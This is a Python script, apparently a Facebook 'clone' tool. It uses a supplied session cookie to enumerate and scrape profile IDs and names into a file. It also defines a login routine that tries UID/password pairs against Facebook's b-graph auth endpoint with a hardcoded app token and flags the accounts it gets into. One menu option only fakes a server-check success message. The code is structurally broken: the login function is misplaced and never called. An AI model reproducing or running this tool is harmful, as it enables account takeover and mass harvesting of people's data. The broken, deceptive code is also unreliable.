import os
import time
import requests
import uuid
from bs4 import BeautifulSoup

CONFIG_FILE = "user_config.txt"
saved_cookie = None
saved_time = 0.0
user_status = "free"

# Load saved user config
if os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, "r") as f:
            lines = f.read().splitlines()
        if len(lines) >= 3:
            saved_cookie = lines[0]
            saved_time = float(lines[1])
            user_status = lines[2]
    except:
        pass

current_time = time.time()

# Main Menu Display
os.system('clear')
print("====================================")
print("    ★ MY Porn-Hub CONTROL ★        ")
print("        DEVELOPER: Devil_King       ")
print("====================================")
print("[#] User Status: " + str(user_status).upper())
print("====================================")
print("[1] (FB Method)")
print("[2] (Fb Friend list cheker)")
print("[3] (old clone)")
print("[4] (File clone)")
print("[5] (Random Clone)")
print("[6] (Exit)")
print("====================================")

choice = input("[★] 1/2/3/4/5/6 : ")

# -------------------------------------------------------------
# METHOD 1: FB UID COLLECTOR (FIXED & UPDATED)
# -------------------------------------------------------------
if choice in ["1", "১"]:
    os.system('clear')
    print("====================================")
    print("        ★ FILE CREATE MENU ★        ")
    print("====================================")
    
    # 1. Ask for Free or Paid option first
    print("[1] Continue as Free User (2 Hours Limit)")
    print("[2] Activate Paid Version (Unlimited)")
    user_choice = input("[+] Select option: ")
    
    if user_choice == "2":
        secret_key = input("[+] Enter Paid Activation Key: ")
        if secret_key == "ADMIN123":
            user_status = "paid"
            print("[+] Activation Successful! Unlimited Mode On.")
        else:
            print("[X] Invalid Key! Continuing as Free User.")
            user_status = "free"
    else:
        user_status = "free"

    # 2. Check Cookie status or prompt for new one
    fb_cookie = None
    if user_status == "paid":
        if saved_cookie and user_status == "paid":
            print("[+] Paid User Detected! Loading saved cookie...")
            fb_cookie = saved_cookie
        else:
            fb_cookie = input("[+] Enter Your FB Cookie: ")
    else:
        if saved_cookie and (current_time - saved_time) < 7200:
            remaining_min = int((7200 - (current_time - saved_time)) / 60)
            print("[+] Active session found! (Expires in " + str(remaining_min) + " minutes)")
            fb_cookie = saved_cookie
        else:
            if saved_cookie:
                print("[!] Your 2-hour free session has expired!")
            fb_cookie = input("[+] Enter Your FB Cookie: ")

    # Save Configuration
    try:
        with open(CONFIG_FILE, "w") as f:
            f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
    except:
        pass

    if fb_cookie:
        # 3. Series selection option as requested (1/2/3 Mix)
        print("\n====================================")
        print("[1] 10000 Series (Old UID)")
        print("[2] 6158 Series (Running/New UID)")
        print("[3] Custom Mix Series")
        print("====================================")
        series_choice = input("[+] Select Series Format: ")

        if series_choice == "1":
            base_uid = "10000"
        elif series_choice == "2":
            base_uid = "6158"
        else:
            base_uid = input("[+] Enter Custom Base UID (e.g., 1000271676): ")

        series_start = int(input("[+] Select Series Start (e.g., 10001): "))
        series_end = int(input("[+] Select Series End (e.g., 99999): "))
        
        output_file = input("[+] Enter Output File Name (e.g., result.txt): ")
        if not output_file.endswith('.txt'):
            output_file += '.txt'
            
        # 4. Storage Path Fix for Android (/sdcard/)
        output_path = os.path.join("/sdcard", output_file)
        
        # Test if /sdcard/ is writeable, otherwise fallback to local file
        try:
            with open(output_path, "a") as test_file:
                pass
        except PermissionError:
            print("[!] Storage Permission Denied! Saving to current directory instead.")
            output_path = output_file

        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
            'Cookie': fb_cookie
        }
        
        print("\n[+] Connecting to server...")
        print("[+] Extracting data... (Press CTRL+C to Stop/Cancel)\n")
        
        # Infinite Loop or Loop through series until user cancels (CTRL+C)
        try:
            for uid_suffix in range(series_start, series_end + 1):
                full_uid = str(base_uid) + str(uid_suffix)
                url = "https://mbasic.facebook.com/profile.php?id=" + str(full_uid)
                
                try:
                    response = session.get(url, headers=headers)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        page_title = soup.find('title')
                        if page_title:
                            profile_name = page_title.text.strip()
                        else:
                            profile_name = "Unknown User"
                            
                        if "Log In" in profile_name or "Error" in profile_name or "Content Not Found" in profile_name:
                            print("[INVALID] UID: " + str(full_uid) + " (Cookie Dead)")
                            break
                        elif "add_friend" in response.text or "Add Friend" in response.text or "নম্বর" in response.text or "বন্ধু" in response.text:
                            # Premium style output layout matching your screenshot
                            print(f"\033[1;32mPremium\033[0m - Successfully Extracted From : \033[1;35m{full_uid}\033[0m")
                            
                            # Save to phone storage path
                            with open(output_path, "a", encoding="utf-8") as file_out:
                                file_out.write(str(full_uid) + " | " + str(profile_name) + "\n")
                        else:
                            print("[SKIPPED] UID: " + str(full_uid) + " (Follower Account)")
                    time.sleep(1.5)
                except KeyboardInterrupt:
                    print("\n[-] Extraction Stopped By User.")
                    break
                except:
                    print("[ERROR] Connection failed for UID " + str(full_uid))
        except KeyboardInterrupt:
            print("\n[-] Process Cancelled.")
            
        print(f"\n[✓] Data Saved Successfully at: {output_path}")
    else:
        print("[X] Cookie Error!")

# -------------------------------------------------------------
# METHOD 2: REEL SERVER CHECK
# -------------------------------------------------------------
if choice in ["2", "২"]:
    os.system('clear')
    print("--- [2] Sex video / Reel Server Check ---")
    site = input("Enter Site Name: ")
    url = "https://www.facebook.com/reel/846400658"
    print("\n[+] Connecting to server via " + str(site) + "...")
    time.sleep(1.5)
    print("\n=======================================")
    print("Target URL: " + str(url))
    print("[✓] STATUS : SERVER CONNECTED SUCCESS")
    print("=======================================")

# -------------------------------------------------------------
# METHOD 3 & 4: EXPIRED OPTIONS
# -------------------------------------------------------------
if choice in ["3", "4", "৩", "৪", "8", "৮"]:
    os.system('clear')
    print("--- Option [" + str(choice) + "] ---")
    print("[X] ERROR: Method Not Found / Expired!")

# -------------------------------------------------------------
# METHOD 5: RANDOM CLONE (B-GRAPH)
# -------------------------------------------------------------
if choice in ["5", "৫"]:
    os.system('clear')
    
    import requests
import uuid
import json

def b_graph_method(uid, password):
    r = requests.Session()
    
    head = {
        'Host': 'b-graph.facebook.com',
        'X-Fb-Connection-Type': 'WIFI',
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', # সাধারণত একটি ডিফল্ট টোকেন লাগে
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) [FBAN/MessengerLite;FBAV/275.0.0.12.119;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/273616641;]'
    }
    
    data = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'email': uid,
        'password': password,
        'generate_analytics_claim': '1',
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_ext_attrib': '0',
        'generate_session_cookies': '1',
        'generate_machine_id': '1',
        'meta_inf_fbmeta': '',
    }
    
    try:
        pos = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
        
        if 'session_key' in pos or 'access_token' in pos:
            print(f"\n[Devil-OK] {uid} | {password}")
        elif 'www.facebook.com' in pos.get('error', {}).get('message', ''):
            print(f"\n[Devil-CP] {uid} | {password}")
        else:
            pass
    except:
        print("\n[X] Network Error!")
       
        # -------------------------------------------------------------
# METHOD 6: EXIT
# -------------------------------------------------------------
if choice in ["6", "৬"]:
    print("\n[+] Thank you for using this tool! Goodbye.")
    exit()

input("\nPress Enter to Exit...")
